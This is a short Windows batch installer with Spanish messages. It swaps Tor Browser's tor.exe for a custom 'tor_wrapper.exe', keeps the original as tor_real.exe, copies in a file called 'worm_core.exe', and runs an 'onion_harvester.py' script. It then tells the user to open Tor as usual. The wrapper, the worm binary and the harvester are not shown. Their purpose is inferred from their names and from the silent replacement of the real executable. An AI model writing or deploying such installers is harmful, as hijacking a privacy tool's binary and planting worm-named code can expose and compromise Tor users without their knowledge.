@echo off
setlocal
title Install - Breadcrumb
color 0B

set "ROOT=%~dp0"
cd /d "%ROOT%"

set "TORROOT=%~1"
if "%TORROOT%"=="" (
    if exist tor_path.txt set /p TORROOT=<tor_path.txt
)
if "%TORROOT%"=="" (
    echo [!] Uso: install.bat "C:\Users\tu_user\Desktop\Tor Browser"
    pause
    exit /b 1
)

if not exist "%TORROOT%\Browser\TorBrowser\Tor\tor.exe" (
    echo [!] tor.exe no encontrado en: %TORROOT%\Browser\TorBrowser\Tor\
    pause
    exit /b 1
)

echo [*] TOR en: %TORROOT%

if not exist "%TORROOT%\Browser\TorBrowser\Tor\tor_real.exe" (
    copy /Y "%TORROOT%\Browser\TorBrowser\Tor\tor.exe" "%TORROOT%\Browser\TorBrowser\Tor\tor_real.exe" >nul
    echo [+] backup: tor_real.exe
)

if not exist tor_wrapper.exe (
    echo [!] tor_wrapper.exe no existe. Compila con build.bat.
    pause
    exit /b 1
)
copy /Y tor_wrapper.exe "%TORROOT%\Browser\TorBrowser\Tor\tor.exe" >nul
echo [+] wrapper instalado como tor.exe

if exist worm_core.exe (
    copy /Y worm_core.exe "%TORROOT%\Browser\TorBrowser\Tor\worm_core.exe" >nul
    echo [+] worm_core.exe copiado
)

if exist onion_harvester.py (
    echo [*] Recolectando onions...
    python onion_harvester.py "%TORROOT%"
)

echo.
echo [+] Instalacion completa. Abre TOR normal.
pause
endlocal